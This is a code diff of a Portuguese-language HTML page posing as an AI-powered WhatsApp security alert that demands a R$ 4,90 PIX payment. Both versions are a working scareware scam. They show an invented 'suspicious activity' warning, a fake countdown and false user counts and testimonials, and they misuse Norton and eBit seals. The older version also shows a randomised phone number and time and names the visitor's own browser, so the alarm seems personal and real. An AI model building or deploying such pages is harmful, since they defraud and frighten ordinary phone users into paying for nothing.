@@ -1,108 +1,165 @@
 <!DOCTYPE html>
-<html lang="pt-BR">
+<html lang="pt-br">
 <head>
   <meta charset="UTF-8">
-  <title>IA WhatsApp Protect</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>IA WhatsApp Protect – Alerta Ativado</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
     body {
       font-family: Arial, sans-serif;
-      background: #fff;
-      color: #000;
+      background-color: #ffffff;
       text-align: center;
-      padding: 30px 20px;
+      padding: 30px;
+      color: #222;
     }
-    .logo { color: #25D366; font-size: 24px; font-weight: bold; }
-    .title { font-size: 20px; font-weight: bold; margin-top: 8px; }
-    .alerta { color: red; font-weight: bold; margin: 20px 0 10px; }
-    .info { font-size: 16px; margin-top: 8px; line-height: 1.6; }
-    .pix-btn {
-      background-color: #25D366;
+
+    h1 {
+      color: #e60000;
+      font-size: 24px;
+    }
+
+    h2 {
+      color: #111;
+      font-size: 20px;
+      margin-bottom: 10px;
+    }
+
+    .alerta {
+      color: red;
+      font-weight: bold;
+      font-size: 18px;
+    }
+
+    .beneficios {
+      text-align: left;
+      display: inline-block;
+      margin: 20px auto;
+      font-size: 15px;
+      line-height: 1.6;
+    }
+
+    .contador {
+      font-size: 20px;
+      color: #e60000;
+      font-weight: bold;
+    }
+
+    button {
+      background-color: #28a745;
       color: #fff;
-      padding: 12px 20px;
+      font-size: 18px;
+      padding: 15px 30px;
       border: none;
-      font-size: 16px;
-      border-radius: 5px;
-      margin-top: 15px;
+      border-radius: 8px;
       cursor: pointer;
+      margin-top: 20px;
     }
-    .copiado { color: green; font-size: 14px; margin-top: 8px; }
-    .contador { color: orange; font-size: 15px; margin-top: 18px; }
+
+    button:hover {
+      background-color: #218838;
+    }
+
+    .selo-container {
+      margin-top: 30px;
+    }
+
+    .selo-container img {
+      height: 30px;
+      margin: 0 10px;
+      vertical-align: middle;
+    }
+
+    .prova-social {
+      font-size: 14px;
+      margin-top: 20px;
+      color: #555;
+    }
+
+    .sombra {
+      box-shadow: 0 0 15px rgba(0,0,0,0.1);
+      padding: 20px;
+      border-radius: 12px;
+      background-color: #f9f9f9;
+      display: inline-block;
+    }
+
+    .destaque-verde {
+      color: green;
+      font-weight: bold;
+    }
+
+    .rodape {
+      font-size: 12px;
+      margin-top: 40px;
+      color: #999;
+    }
   </style>
+  <script>
+    function iniciarContador() {
+      let tempo = 900; // 15 minutos
+      const contadorEl = document.getElementById("contador");
+
+      const intervalo = setInterval(() => {
+        const minutos = String(Math.floor(tempo / 60)).padStart(2, '0');
+        const segundos = String(tempo % 60).padStart(2, '0');
+        contadorEl.textContent = `${minutos}:${segundos}`;
+        tempo--;
+
+        if (tempo < 0) {
+          clearInterval(intervalo);
+          contadorEl.textContent = "Expirado";
+        }
+      }, 1000);
+    }
+
+    function copiarPix() {
+      const chave = "chavepix@protege.com";
+      navigator.clipboard.writeText(chave).then(() => {
+        alert("✅ Chave PIX copiada com sucesso!");
+        console.log("BOTAO_PIX_CLICADO");
+      });
+    }
+
+    window.onload = iniciarContador;
+  </script>
 </head>
 <body>
 
-  <div class="logo">🔒 IA WhatsApp Protect</div>
-  <div class="title">Escudo de segurança ativado</div>
+  <div class="sombra">
+    <img src="https://cdn-icons-png.flaticon.com/512/4086/4086679.png" alt="Escudo" width="50">
+    <h1>🚨 IA WhatsApp Protect – Alerta de Segurança Ativado</h1>
 
-  <div class="alerta">⚠️ Atividade suspeita detectada</div>
+    <p class="alerta">Atividade suspeita detectada no número +55 11 9XXXX‑4026<br>
+    Localização: São Paulo – 01:24h</p>
 
-  <div class="info">
-    Detectamos um possível acesso indevido ao seu WhatsApp:<br>
-    Número: <b id="numero"></b><br>
-    Localização suspeita: <b>São Paulo – <span id="hora"></span></b><br><br>
+    <h2>🛡️ Proteção imediata por apenas <span class="destaque-verde">R$ 4,90</span></h2>
+    <p>Seu WhatsApp foi marcado para ativação emergencial. O sistema IA Protect está bloqueando ameaças em tempo real.</p>
 
-    <b><span id="sistemaNome"></span></b> ativou automaticamente o protocolo de emergência IA WhatsApp Protect,<br>
-    com escaneamento de ameaças em tempo real utilizando <b>tecnologia de Inteligência Artificial</b>.<br><br>
+    <div class="beneficios">
+      <ul>
+        <li>✔️ Inteligência Artificial com escaneamento 24h</li>
+        <li>✔️ Ativação automática via Google Chrome</li>
+        <li>✔️ Garantia de segurança digital e reembolso imediato</li>
+        <li>✔️ Suporte 24h via canal prioritário</li>
+      </ul>
+    </div>
 
-    🔐 <b>Proteção instantânea por apenas R$ 4,90</b><br>
-    <span style="color:green;">Faça a validação da proteção agora</span>
+    <p class="prova-social">🟢 5.423 usuários ativaram hoje<br>“Me salvou de um golpe no WhatsApp!” — Ana, RJ</p>
+
+    <p class="contador">⏱️ Oferta expira em <span id="contador">15:00</span></p>
+
+    <button onclick="copiarPix()">🔐 Ativar Proteção Agora – Copiar Chave PIX</button>
+
+    <div class="selo-container">
+      <img src="https://logospng.org/download/pix/logo-pix-icone-512.png" alt="Pix">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/2/2e/Norton-logo-2021.png" alt="Norton">
+      <img src="https://logodownload.org/wp-content/uploads/2016/10/selo-ebit-logo.png" alt="eBit">
+      <img src="https://cdn-icons-png.flaticon.com/512/747/747376.png" alt="Suporte">
+    </div>
+
+    <p class="rodape">100% Seguro • Política de privacidade • Garantia de reembolso<br>
+    Este site não é afiliado ao WhatsApp Inc. ou Google LLC.</p>
   </div>
 
-  <button class="pix-btn" onclick="copiarPix()">Copiar Chave Pix</button>
-  <div id="copiado" class="copiado" style="display:none;">✔ Chave Pix copiada</div>
-
-  <div class="contador" id="timer">⏳ Sua autenticação expira em 90 segundos.</div>
-
-  <script>
-    // Número parcialmente mascarado
-    function gerarNumero() {
-      const final1 = Math.floor(Math.random() * 90 + 10);
-      const final2 = Math.floor(Math.random() * 90 + 10);
-      return `+55 11 9XXXX-${final1}${final2}`;
-    }
-    document.getElementById("numero").innerText = gerarNumero();
-
-    // Hora aleatória
-    function gerarHora() {
-      const h = String(Math.floor(Math.random() * 5) + 1).padStart(2, '0');
-      const m = String(Math.floor(Math.random() * 60)).padStart(2, '0');
-      return `${h}:${m}h`;
-    }
-    document.getElementById("hora").innerText = gerarHora();
-
-    // Nome do navegador
-    function detectarNavegador() {
-      const ua = navigator.userAgent;
-      if (ua.includes("Chrome") && !ua.includes("Edg") && !ua.includes("OPR")) return "O Google Chrome";
-      if (ua.includes("Firefox")) return "O Mozilla Firefox";
-      if (ua.includes("Safari") && !ua.includes("Chrome")) return "O Safari";
-      if (ua.includes("OPR") || ua.includes("Opera")) return "O Opera";
-      if (ua.includes("Edg")) return "O Microsoft Edge";
-      return "O sistema";
-    }
-    document.getElementById("sistemaNome").innerText = detectarNavegador();
-
-    // Timer regressivo
-    let segundos = 90;
-    const timer = document.getElementById("timer");
-    const intervalo = setInterval(() => {
-      segundos--;
-      timer.innerText = `⏳ Sua autenticação expira em ${segundos} segundos.`;
-      if (segundos <= 0) {
-        clearInterval(intervalo);
-        timer.innerHTML = "⚠️ <span style='color:red'>Tempo expirado. Tente novamente.</span>";
-        timer.style.color = "red";
-      }
-    }, 1000);
-
-    // Copiar Pix
-    function copiarPix() {
-      const chave = `00020101021226850014br.gov.bcb.pix2563pix.santander.com.br/qr/v2/14e57911-d312-47bd-ac6d-0ae819a3772c52040000530398654044.905802BR5923SUL INTERMEDIACOES LTDA6009SAO PAULO62070503***6304BAAB`;
-      navigator.clipboard.writeText(chave).then(() => {
-        document.getElementById("copiado").style.display = "block";
-      });
-    }
-  </script>
 </body>
 </html>
